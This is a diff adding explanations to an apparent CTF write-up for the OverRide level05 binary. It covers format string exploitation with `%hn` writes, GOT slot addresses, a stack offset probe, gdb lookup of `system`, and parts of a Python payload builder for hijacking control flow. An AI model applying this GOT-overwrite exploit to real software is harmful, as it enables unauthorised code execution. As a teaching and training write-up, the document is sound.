@@ -28,6 +28,8 @@ Because `printf` interprets `%...` sequences, attacker-controlled input can:
 1. read stack data (`%x`, `%p`, ...), and
 2. **write memory** via `%n`/`%hn`.
 
+(In C printf, %n and %hn are special format specifiers used to write data to memory rather than print it. They store the count of characters printed so far into a provided pointer argument. %n writes a standard integer (4 bytes), while %hn writes a short integer (2 bytes), commonly used in format string exploits. )
+
 That write primitive is enough to hijack control flow through GOT entries.
 
 ---
@@ -37,7 +39,22 @@ That write primitive is enough to hijack control flow through GOT entries.
 On 32-bit ELF with dynamic linking:
 
 - `printf@plt` dispatches through `printf@GOT` (`0x080497d4`)
+
+```
+08048340 <printf@plt>:
+ 8048340:	ff 25 d4 97 04 08    	jmp    *0x80497d4
+ 8048346:	68 00 00 00 00       	push   $0x0
+ 804834b:	e9 e0 ff ff ff       	jmp    8048330 <_init+0x38>
+```
+
 - `exit@plt` dispatches through `exit@GOT` (`0x080497e0`)
+
+```
+08048370 <exit@plt>:
+ 8048370:	ff 25 e0 97 04 08    	jmp    *0x80497e0
+ 8048376:	68 18 00 00 00       	push   $0x18
+ 804837b:	e9 b0 ff ff ff       	jmp    8048330 <_init+0x38>
+```
 
 If we overwrite a GOT slot, the program will jump to our chosen address when that function is called next.
 
@@ -66,6 +83,12 @@ Seeing stack-like values printed confirms that input is interpreted as format st
 
 Use positional prints (`%1$x`, `%2$x`, ... or many `%p`) until a marker from your buffer appears.
 
+(level05@OverRide:~$ ./level05 
+iiii %1x %2x %3x %4x %5x %6x %7x %8x %9x %10x
+iiii 64 f7fcfac0 f7ec3af9 ffffd6ef ffffd6ee      0 ffffffff ffffd774  f7fdb000   69696969
+'69 is the ascii code of i' 
+)
+
 You observed your controlled bytes around argument positions used later as `%10$hn` and `%11$hn`.
 
 ### 3.3 Confirm write targets
@@ -83,13 +106,14 @@ Relevant entries:
 
 ### 3.4 Get runtime `system` address
 
-From `gdb` on target libc/session:
+From `gdb`:
 
-```gdb
+```gdb ./level05
+run
 p system
 ```
 
-Your payload uses `SYSTEM = 0xf7e6aed0`.
+`SYSTEM = 0xf7e6aed0`.
 
 ---
 
@@ -129,6 +153,43 @@ def fmt_write_2bytes(addr, value, i1=10, i2=11):
         p2 = (lo - hi) % 0x10000
         return head + "%%%dx%%%d$hn%%%dx%%%d$hn" % (p1, i1, p2, i2)
 ```
+
+### Why `lo = value & 0xffff hi = (value >> 16) & 0xffff`
+
+This is splitting a number into two 16-bit pieces (low and high parts).
+
+lo = value & 0xffff
+→ Keeps only the lowest 16 bits of value
+(0xffff in hex = 16 ones in binary)
+hi = (value >> 16) & 0xffff
+→ First shifts the number right by 16 bits (so the upper half moves down)
+→ Then keeps only those 16 bits
+
+So effectively:
+
+lo = lower half (bits 0–15)
+hi = upper half (bits 16–31)
+
+value = 0x12345678
+lo = 0x5678
+hi = 0x1234
+
+### Why `a_lo = struct.pack('<I', addr) a_hi = struct.pack('<I', addr + 2)`
+
+- a_lo = struct.pack('<I', addr)
+'<I' means:
+    < → little-endian (least significant byte first)
+    I → unsigned 32-bit integer (4 bytes)
+
+So this converts addr into 4 bytes in little-endian order
+
+- a_hi = struct.pack('<I', addr + 2)
+Same thing, but packs addr + 2 instead
+
+If: addr = 0x12345678
+Then:
+    a_lo → b'\x78\x56\x34\x12'
+    a_hi → b'\x7a\x56\x34\x12' (because 0x12345678 + 2 = 0x1234567A)
 
 ### Why `%hn` and not `%n`
 
